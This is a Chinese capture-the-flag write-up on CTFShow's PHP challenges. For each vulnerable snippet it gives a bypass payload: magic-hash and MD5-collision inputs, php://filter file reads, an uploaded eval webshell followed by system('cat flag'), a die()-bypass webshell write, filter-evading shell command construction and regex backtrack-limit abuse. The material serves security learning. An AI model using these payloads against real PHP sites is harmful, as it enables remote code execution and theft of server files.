CTFShow PHP特性
========

**题目范围：Web89 - Web115 | Web123 - Web150**



### 1、数组绕过正则表达式

**（Web 89）**

**preg_match()**

此函数用于执行正则表达式匹配

**语法**:

```
int preg_match ( string $pattern , string $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] )
```

**参数说明**：

`$pattern`: 要搜索的模式，字符串形式。

`$subject`: 输入字符串。

`$matches`: 如果提供了参数matches，它将被填充为搜索结果。` $matches[0]`将包含完整模式匹配到的文本， `$matches[1] `将包含第一个捕获子组匹配到的文本，以此类推。

`$flags`：flags 可以被设置为以下标记值：PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。

`offset`: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。

**返回值(重点)：**

返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。

**绕过姿势:**

如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错，从而返回false，达到我们的目的。

```php
<?php
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if (preg_match("/[0-9]/", $num)) {
        die("no no no!");
    }
    if (intval($num)) {
        echo $flag;
    }
}
?>
```

**重点：preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1 !!!**

preg_match 第二个参数要求是字符串，如果传入数组则不会进入 if 语句

payload:`num[]=1`





### 2、intval 函数的使用

**（Web 90）**

**intval()** 函数用于获取变量的整数值。它通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。

如果他的值为一个数组，只要数组里面有值(产生 E_NOTICE 错误)，那么不论值的数量，返回值都为1，空数组则返回0

```php
intval( mixed $value, int $base = 10) : int
```

参数说明：

- $var：要转换成 integer 的数量值。
- $base：转化所使用的进制。

如果 base 是 0，通过检测 value 的格式来决定使用的进制：

- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)。
- 如果base为0，则$var中存在字母的话遇到字母就停止读取，传入4476a会将后面的a丢弃，比较前面的

成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。

字符串有可能返回 0，虽然取决于字符串最左侧的字符。

**Web 92：intval()函数如果$base为0，则$var中存在字母的话遇到字母就停止读取，但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以**

```php
<?php
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num === "4476") {
        die("no no no!");
    }
    if (intval($num, 0) === 4476) {
        echo $flag;
    } else {
        echo intval($num, 0);
    }
}
?>
```

科学计数法也可以绕过

```php
intval('4476.0')===4476    小数点 #intval只识别整数部分
intval('+4476.0')===4476   正负号
intval('4476e0')===4476    科学计数法
intval('0x117c')===4476    16进制
intval('010574')===4476    8进制 #当题目过滤字母时，2和16进制都不好用
intval(' 010574')===4476   8进制+空格 #当要求存在0且0不是首位时
intval('+010574')===4476   8进制+加号
intval('%2b010574')===4476
intval('0b1000101111100')===4476  2进制
```

payload:`num=4476.0`





### 3、正则表达式修饰符

**（Web 91）**

```php
<?php
if (preg_match('/^php$/im', $a)) {
    if (preg_match('/^php$/i', $a)) {
        echo 'hacker';
    } else {
        echo $flag;
    }
} else {
    echo 'nonononono';
}
?>
```

i 不区分 (ignore) 大小写；m 多 (more) 行匹配，若有换行符则以换行符分割，按行匹配

payload:`abc%0aphp`，第一行匹配换行后有 php 故通过，第二个不符合 php 开头 php 结尾故不通过（这里的'%0a'是url编码的换行符。）

> 官方给的链接：（Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展）
>
> https://blog.csdn.net/qq_46091464/article/details/108278486

**正则表达式扩展**

```
i 
不区分(ignore)大小写

m
多(more)行匹配
若存在换行\n并且有开始^或结束$符的情况下，
将以换行为分隔符，逐行进行匹配
$str = "abc\nabc";
$preg = "/^abc$/m";
preg_match($preg, $str,$matchs);
这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。

s
特殊字符圆点 . 中包含换行符
默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符
$str = "abggab\nacbs";
$preg = "/b./s";
preg_match_all($preg, $str,$matchs);
这样匹配到的有三个 bg b\n bs

A
强制从目标字符串开头匹配;

D
如果使用$限制结尾字符,则不允许结尾有换行; 

e
配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 
```





### 4、highlight_file 路径

**（Web 96）**

highlight_file 的参数可以是路径的

```php
<?php
highlight_file(__FILE__);

if (isset($_GET['u'])) {
    if ($_GET['u'] == 'flag.php') {
        die("no no no");
    } else {
        highlight_file($_GET['u']);
    }
}
?>
```

if 语句只比对字符串，highlight_file 可以写路径，故 payload 有多种解法：

```php
/var/www/html/flag.php              绝对路径
./flag.php                          相对路径
php://filter/resource=flag.php      php伪协议
php://filter/read=convert.base64-encode/resource=flag.php
```

```
payload：
1. ?u=php://filter/read=convert.base64-encode/resource=flag.php
2. ?u=php://filter/resource=flag.php
3. ?u=./flag.php 
4. ?u=/var/www/html/flag.php
```





### 5、md5 比较缺陷

#### 第一种

**（Web 97）**

PHP 中 hash 比较是存在缺陷的，MD5 无法处理数组，如果传入数组则返回 NULL，两个 NULL 是强相等的

```php
<?php
    if ($_POST['a'] != $_POST['b']) {
    if (md5($_POST['a']) === md5($_POST['b'])) {
        echo $flag;
    } else {
        print 'Wrong.';
    }
}
?>
```

payload:`a[]=1&b[]=2`



#### 第二种

**如果进行了string强制转类型后，则不再接受数组**

**md5 弱比较，使用了强制类型转换后不再接收数组**

```php
<?php
$a = (string)$a;
$b = (string)$b;
if (($a !== $b) && (md5($a) == md5($b))) {
    echo $flag;
}
?>
```

md5 弱比较，为 0e 开头的会被识别为科学记数法，结果均为 0，所以只需找两个 md5 后都为 0e 开头且 0e 后面均为数字的值即可。

这里附上常见的 0E 开头的 MD5

```
原值：             MD5值：
QNKCDZO           0e830400451993494058024219903391
240610708         0e462097431906509019562988736854
s878926199a       0e545993274517709034328855841020
s155964671a       0e342768416822451524974117254469
s214587387a       0e848240448830537924465865611904
s214587387a       0e848240448830537924465865611904
s878926199a       0e545993274517709034328855841020
s1091221200a      0e940624217856561557816327384675
s1885207154a      0e509367213418206700842008763514
s1502113478a      0e861580163291561247404381396064
s1885207154a      0e509367213418206700842008763514
s1836677006a      0e481036490867661113260034900752
s155964671a       0e342768416822451524974117254469
s1184209335a      0e072485820392773389523109082030
s1665632922a      0e731198061491163073197128363787
s1502113478a      0e861580163291561247404381396064
s1836677006a      0e481036490867661113260034900752
s1091221200a      0e940624217856561557816327384675
s155964671a       0e342768416822451524974117254469
s1502113478a      0e861580163291561247404381396064
s155964671a       0e342768416822451524974117254469
s1665632922a      0e731198061491163073197128363787
s155964671a       0e342768416822451524974117254469
s1091221200a      0e940624217856561557816327384675
s1836677006a      0e481036490867661113260034900752
s1885207154a      0e509367213418206700842008763514
s532378020a       0e220463095855511507588041205815
s878926199a       0e545993274517709034328855841020
s1091221200a      0e940624217856561557816327384675
s214587387a       0e848240448830537924465865611904
s1502113478a      0e861580163291561247404381396064
s1091221200a      0e940624217856561557816327384675
s1665632922a      0e731198061491163073197128363787
s1885207154a      0e509367213418206700842008763514
s1836677006a      0e481036490867661113260034900752
s1665632922a      0e731198061491163073197128363787
s878926199a       0e545993274517709034328855841020
```

payload: `a=QNKCDZO&b=240610708`

_MD5 等于自身_，如`md5($a)==$a`，php 弱比较会把 0e 开头识别为科学计数法，结果均为 0，所以此时需要找到一个 MD5 加密前后都是 0e 开头的，如`0e215962017`



#### 第三种

**md5 强碰撞**

```php
<?php
$a = (string)$a;
$b = (string)$b;
if (($a !== $b) && (md5($a) === md5($b))) {
    echo $flag;
}
?>

这时候需要找到两个真正的md5值相同数据

a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```





### 6、三目运算符的理解 + 变量覆盖

**（Web 98）**

关于三目运算符

```
$if_summary = $roW['IF_SUMMARY']==2?'是':'否';
等价于

if ($row['IF_SUMMARY'] == 2) {
    $if_summary = "是";
} else {
    $if_summary = "否";
}
```



```php
<?php
include("flag.php");
$_GET ? $_GET = &$_POST : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_COOKIE : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_SERVER : 'flag';
highlight_file($_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__);

    

// 解析
$_GET ? $_GET = &$_POST : 'flag';
==============>
if ($_GET) {
    $_GET = &$_POST; //只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)
} else {
    "flag";
}


// 解析
$_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__;
==============>
if ($_GET['HTTP_FLAG'] == 'flag') {
    $flag;
} else {
    __FILE__;
}
```

> 该函数首先包含了一个名为"flag.php"的文件。然后，根据`$_GET`是否存在，如果存在则将其赋值为`$_POST`，否则赋值为'flag'。接下来，判断`$_GET['flag']`是否等于'flag'，如果等于则将其赋值为`$_COOKIE`，否则赋值为'flag'。最后，判断`$_GET['flag']`是否等于'flag'，如果等于则将其赋值为`$SERVER`，否则赋值为'flag'。最后，根据`$GET['HTTP_FLAG']`是否等于'flag'，如果等于则输出`$flag`，否则输出`__FILE__`。(等于 flag 就输出 flag，不等于显示源码)
>
> **中间的代码没有作用，因为我们不提交 flag 参数**

所以只需要传入一个任意的 GET 保证`$_GET`是被设置的。然后 POST 一个覆盖它 。

既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG=flag就可以了

payload:`get：1=1 post：HTTP_FLAG=flag`





### 7、php 弱类型比较 in_array()

**（Web 99）**

```php
<?php
$allow = array();
for ($i = 36; $i < 0x36d; $i++) {
    array_push($allow, rand(1, $i));
}
if (isset($_GET['n']) && in_array($_GET['n'], $allow)) {
    file_put_contents($_GET['n'], $_POST['content']);
}
?>

该函数首先创建一个空数组$allow，然后使用for循环生成1到(36-0x36d)之间的随机数，并将其添加到$allow数组中。接下来，如果$_GET['n']存在且在$allow数组中，则将$_POST['content']写入到$_GET['n']指定的文件中。
```

[array_push() 函数](https://www.runoob.com/php/func-array-push.html)：向数组尾部插入一个或多个元素

[rand() 函数](https://www.runoob.com/php/func-math-rand.html)随机生成数组rand(min,max)

[file_put_contents() 函数](https://www.runoob.com/php/func-filesystem-file-put-contents.html)：把一个字符串写入文件中

**这题突破点在`in_array()`函数**

in_array：(PHP 4, PHP 5, PHP 7)

功能：检查数组中是否存在某个值

```php
bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )
```

在 `$haystack`中搜索` $needle`，如果第三个参数` $strict`的值为 TRUE，则 in_array()函数会进行强检查，检查 `$needle`的类型是否和 `$haystack`中的相同。如果找到 `$haystack`，则返回 TRUE，否则返回 FALSE。

很明显，这题使用in_array()函数时并没有设置第三个参数为TRUE，所以此时是==的弱类型比较。（弱比较字符串 1.php 与 1 返回 true）

**绕过方法:**
传入n=1.php。（这道题，每次生成随机数都包含 1，所以 1 在数组中的可能最大）因为PHP在使用 in_array()函数判断时，会将 1.php强制转换成数字1，而数字1在 range(1,24)数组中，当随机生成的数字正好是1时绕过 in_array()函数判断，导致任意文件上传漏洞。

**payload:**

```
n=1.php
post:content=<?php eval($_POST[1]);?>
```

多试几次，直到不报错的那一次，说明成功传入一句话。

然后访问https://url/1.php，再post传入1=system('ls');

再post: 1=system('cat flag***.php')；

然后在网页源码中看到flag





### 8、and与&& 、or与||的区别

**（Web 100）**

> 以下是对php中OR与||、AND与&&的区别进行了详细的总结介绍

本身没有区别，习惯问题 ，但是有时候牵涉到运算符优先级的问题，结果会不同。

赋值运算的优先级比AND和OR的高，所以先赋值；比&&和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值

例如：

```php
<?php
$p = 6 or 0;
var_dump($p);//int(6)

$p = 6 || 0;
var_dump($p);//bool(true)

$p = 6 and 0;
var_dump($p); //int(6) 

$p = 6 && 0;
var_dump($p); //bool(false) 
?>
```

```php
<?php
$bA = true;
$bB = false;
$b1 = $bA and $bB;
$b2 = $bA && $bB;
var_dump($b1); // $b1 = true
var_dump($b2); // $b2 = false
$bA = false;
$bB = true;
$b3 = $bA or $bB;
$b4 = $bA || $bB;
var_dump($b3); // $b3 = false
var_dump($b4); // $b4 = true


$bA = true;
$bB = false;
var_dump($bA and $bB); // false
var_dump($bA && $bB); // false
$bA = false;
$bB = true;
var_dump($bA or $bB); // true
var_dump($bA || $bB); // true
?>
```

通过这个表，我们可以看到 and/&& 和 or/|| 这两组运算符的优先级竟然是不一样的。and和or的优先级是低于=的，所以上面的代码就好理解了，就是先做赋值然后再做了一个and或or的逻辑运算，这个运算的结果并没有存下来， 所以最后出来让我们匪夷所思的结果。

| 结合性   | 运算符                                                  | 额外信息                |
| :------- | :------------------------------------------------------ | :---------------------- |
| 无结合性 | clone new                                               | 克隆和new               |
| 左       | [                                                       | 数组                    |
| 左       | **                                                      | 算术                    |
| 右       | ++ — ~ (int) (float) (string) (array) (object) (bool) @ | 类型和自增/自减         |
| 无结合性 | instanceof                                              | 类型                    |
| 右       | !                                                       | 逻辑运算                |
| 左       | * / %                                                   | 算术                    |
| 左       | + – .                                                   | 算术和字符串            |
| 左       | << >>                                                   | 按位运算                |
| 无结合性 | < <= > >=                                               | 比较运算                |
| 无结合性 | `== != === !== <>`                                      | 比较运算                |
| 左       | &                                                       | 按位运算和引用          |
| 左       | ^                                                       | 按位运算                |
| 左       | \| 按位运算                                             |                         |
| 左       | &&                                                      | 逻辑运算                |
| 左       | \| \| 逻辑运算                                          |                         |
| 左       | ?:                                                      | 三元条件选择            |
| 右       | = += -= *= /= .= %= &=                                  | = ^= <<= >>= => \| 赋值 |
| 左       | and                                                     | 逻辑运算                |
| 左       | xor                                                     | 逻辑运算                |
| 左       | or                                                      | 逻辑运算                |
| 左       | ,                                                       | 很多使用                |



> **题目：（Web 100）**

```php
// Web 100

<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1 = $_GET['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if ($v0) {
    if (!preg_match("/\;/", $v2)) {
        if (preg_match("/\;/", $v3)) {
            eval("$v2('ctfshow')$v3");
        }
    }
}
?>
```

因为赋值的优先级(=)高于and所以v 0 的 值 可 以 由 v0的值可以由v0的值可以由v1来控制，所以我们需要给其赋值为1也就是true

**Payload：**

```php
?v1=1&v2=var_dump($ctfshow)&v3=;
v1=1&v2=system("cat ctfshow.php")/*&v3=*/;
```

因为源码中给了提示 ：`flag in class ctfshow;`，所以输出一个新的"ctfshow"类。

得到 flag_is_bde4fb430x2d62590x2d404f0x2dbaa30x2da2d6bd94ed98
把ox2d换成-，再套上{}即可

注意这里v3只能包含`;`，可以是多个叠加，但不能有其他字符。

**var_dump() 函数用于输出变量的相关信息。**





### 9、反射类 ReflectionClass

**（Web 101）**

反射类，做过题都是直接输出这个类`echo new ReflectionClass('类名');`

利用反射类，`Relectionclass()`函数，作用：根据类名反射一个类。在代码执行时，加入输入一个A，但是在逻辑判断之后，生成了一个B类，所以这时，用Relectionclass("A")来限定生成A类。

```php
// （Web 101）

<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1 = $_GET['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if ($v0) {
    if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)) {
        if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)) {
            eval("$v2('ctfshow')$v3");
        }
    }
}
?>
```

**payload：**`?v1=1&v2=echo new ReflectionClass&v3=;`

反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句

其属性为类的一个名称，这道题目里面类的名称为ctfshow

**举例：**

```php
<?php
class hacker
{
    public $hackername = "yn8rt";
    const  yn8rt = 'nb666';
    public  function show()
    {
        echo $this->name, '<br>';
    }
}
//有这么一个hacker类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射
//现在我可以通过反射来获取这个类中的方法，属性，常量

//通过反射获取类的信息

$reflection = new ReflectionClass('hacker'); //实例化反射对象,映射hacker类的信息
$consts = $reflection->getConstants(); //获取所有常量
$props = $reflection->getProperties(); //获取所有属性
$methods = $reflection->getMethods(); //获取所有方法
var_dump($consts);
var_dump($props);
var_dump($methods);

?>
```

**返回值：**

```php
<?php
array(1) {
  ["yn8rt"]=>
  string(5) "nb666"
}
array(1) {
  [0]=>
  &object(ReflectionProperty)#2 (2) {
    ["name"]=>
    string(10) "hackername"
    ["class"]=>
    string(6) "hacker"
  }
}
array(1) {
  [0]=>
  &object(ReflectionMethod)#3 (2) {
    ["name"]=>
    string(4) "show"
    ["class"]=>
    string(6) "hacker"
  }
}
?>
```

如果没有指定方法的话，就会像题目中默认输出很多东西：

1. 常量 Contants
2. 属性 Property Names
3. 方法 Method Names静态
4. 属性 Static Properties
5. 命名空间 Namespace
6. Person类是否为final或者abstract
7. Person类是否有某个方法





------

### 进度 分割线

------

单引号包裹的内容只能当做纯字符串, 而双引号包裹的内容, 可以识别变量, 所以 `"$url"` 可以当做` $url` 变量被正常执行



PHP开始结束标签

> `<?php ?>`：php默认的开始、结束标签 
>
> `<? ?>`：需要开启short_open_tag ，即short_open_tag = On。
>
>  `<% %>`：需要开启asp_tags ，即asp_tags = On。
>
>  `<?= ?>`：用于输出，等同于- 可以直接使用
>
>  `<%= %>`：用于输出，等同于- ，需要开启asp_tags ，才可以使用











### 10、is_numeric 与 hex2bin

 is_numeric 在 PHP5 中是可以识别十六进制的，hex2bin 参数不能带 0x





### 11、sha1 比较缺陷

sha1 无法处理数组，如下可使用 a[]=1&b[]=1 数组绕过

```php
<?php
if ($a == $b) {
    if (sha1($a) == sha1($b)) {
        echo $flag;
    }
}
?>
```

但 MD5 或者 sha1 这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如

`aaroZmOk`  
`aaK1STfY`  
`aaO8zKZF`  
`aa3OFF9m`





### 12、PHP 双 $（$$）的变量覆盖

在双写 $ 的时候，属于动态变量，就是后面的变量值作为新的变量名

```php
$test="a23";    $test等于a23
$$test=456;     $$test也就等于$23,这里相当于给$a23赋值了
echo $test;     正常输出$test为a23
echo $$test;    这里输出$$test，就是$a23，为456
echo $a23;      第二行给$a23赋值了，这里正常输出
```





### 13、parse_str 函数的使用

parse_str 会把字符串解析为变量，大部分是传入的多个值

```php
$a="q=123&p=456";
parse_str($a);
echo $q;                输出123
echo $p;                输出456
parse_str($a,$b);       第二个参数作为数组，解析的变量都存入这个数组中
echo $b['q'];           输出123
echo $b['p'];           输出456
```

php8 版本必须要有第二个参数，php7 不影响使用但会警告一下





### 14、ereg %00 正则截断

ereg PHP5.3 废弃了，功能可以由 preg_match 代替，ereg 有个截断漏洞，字符串里包括 %00 就只匹配 %00 之前的内容。所以可以前面根据正则改，后面是执行语句，如果有 strrev() 这种字符串反转函数配合用更好。





### 15、迭代器获取当前目录

FilesystemIterator 可以获得文件目录，参数需要 `.` 或者具体路径，getcwd() 这个函数可以获取当前文件路径，二者在一定条件下配合使用较好





### 16、$GLOBALS 全局变量的使用

$GLOBALS — 引用全局作用域中可用的全部变量  
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

构造出 var_dump($GLOBALS); 可以输出全部变量值，包括自定义





### 17、php 伪协议绕过 is_file highlight_file 对于 php 伪协议的使用

is_file 判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file 会认为 php 伪协议不是文件。但 highlight_file 认为伪协议可以是文件。

```php
<?php
if (!is_file($file)) {
    highlight_file($file);
} else {
    echo "hacker!";
}
?>
```

如上的代码，可以传入 php 伪协议进行绕过并且显示含有 flag 的文件。若有过滤，可以换其他伪协议或改编码方式





### 18、多写根目录绕过 is_file

在 linux 中 / proc/self/root 是指向根目录的，也就是如果在命令行中输入 ls /proc/self/root，其实显示的内容是根目录下的内容  
多次重复后绕过 is_file 的具体原理尚不清楚。如上面的代码，也可以用下面 payload 代替

```php
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

这个按理说也是文件的，但 is_file 认为不是





### 19、trim 函数的绕过 + is_numeric 绕过

这两个函数一起检测时，`is_numeric`认为内容里有 %09 %0a %0b %0c %0d %20 也算数字，跟 trim 一起测试一下

```php
for ($i = 0; $i <= 128; $i++) {
    $x = chr($i) . '1';
    if (trim($x) !== '1' &&  is_numeric($x)) {
        echo urlencode(chr($i)) . "\n";
    }
}
```

除了 +-. 号以外还有只剩下 %0c 也就是换页符了，trim 默认时没有剔除 %0c。形如以下代码可以绕过

```php
if (is_numeric($num) and $num !== '36' and trim($num) !== '36') {
    if ($num == '36') {
        echo $flag;
    } else {
        echo "hacker!!";
    }
}
```

payload:`num=%0c36`





### 20、绕过死亡 die

```php
<?php
function filter($x)
{
    if (preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i', $x)) {
        die('too young too simple sometimes naive!');
    }
}
$file = $_GET['file'];
$contents = $_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>" . $contents);
?>
```

这道看了羽师傅 wp，过滤了许多协议，这是取一个 UCS-2LE UCS-2BE

```php
payload:
file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
post:contents=?<hp pvela$(P_SO[T]1;)>?
```

这会将字符两位两位交换，file_put_contents 在写入的时候会破坏那句 die，但 contents 那句恢复原貌，可以执行





### 21、通过内置 bash 命令构造命令

在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造`nl`，可以写为下面这种方式

`${PATH:14:1}${PATH:5:1}`

在 linux 中可以用`~`获取变量的最后几位，也可以写为`${PATH:~0}${PWD:~0}`，字母与 0 作用一样，`${PATH:~A}${PWD:~A}`也是 nl，flag.php 也过滤了的话可以用????.???，具体情况，具体对待





### 22、PHP 变量名非法字符

比如传入 AA_BB.CC 这个变量，PHP 是不允许变量名中含有`.` 的，会默认将不合法字符替换为`_`, 如下：

```php
<?php 
var_dump($_POST);
?>         
传值：AA.BB.CC=14
输出：array(1) { ["AA_BB_CC"]=> string(2) "14" }
```

但输入`AA[BB.CC`它就只替换 `[` 输出 array(1) { [“AA_BB.CC”]=> string(2) “14” }





### 23、gettext 拓展的使用

```php
var_dump(call_user_func($f1,$f2));
```

如以上代码，多重过滤后，f1 可以为`gettext`，f2 可以为`phpinfo`，如果过滤更为严格，更改 ini 文件里的拓展后， `_()` 等效于 `gettext()`

```php
<?php
echo gettext("phpinfo");
结果  phpinfo

echo _("phpinfo");
结果 phpinfo
```





### 24、正则最大回溯次数绕过

PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit  
回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。

也就是说前面 100 万个字母，后面是语句就好，如下面的例子

```php
<?php
if (preg_match('/.+?ABC/is', $f)) {
    die('bye!');
}
if (stripos($f, 'ABC') === FALSE) {
    die('bye!!');
}
echo $flag;
?>
```

前面 100 万个字母后面 ABC 就可以 echo $flag





### 25、调用类中的函数

-> 用于动态语境处理某个类的某个实例  
:: 可以调用一个静态的、不依赖于其他初始化的类方法

也就是说双冒号不用实例化类就可以调用类中的静态方法

```php
<?php
class ctfshow
{
    function __wakeup()
    {
        die("private class");
    }
    static function getFlag()
    {
        echo file_get_contents("flag.php");
    }
}
call_user_func($_POST['ctfshow']);
?>
```

这个传入 ctfshow=ctfshow::getFlag 即可





### 26、return 绕过

`eval("return 1;phpinfo();");`会发现是无法执行 phpinfo() 的，但是 php 中有个有意思的地方，数字是可以和命令进行一些运算的，例如 `1-phpinfo();`是可以执行 phpinfo() 命令的。





### 参考：


>  [PHP特性总结](https://www.cnblogs.com/murkuo/p/15388795.html)
>
> [ctf show-web入门 php特性篇部分题解](https://blog.csdn.net/weixin_45696568/article/details/113631173)
>
> [ctfshow-php特性-超详解(干货)](https://blog.csdn.net/qq_50589021/article/details/119425927)
>
> [ctfshow_web入门 PHP特性](https://www.cnblogs.com/upstream-yu/p/15110382.html)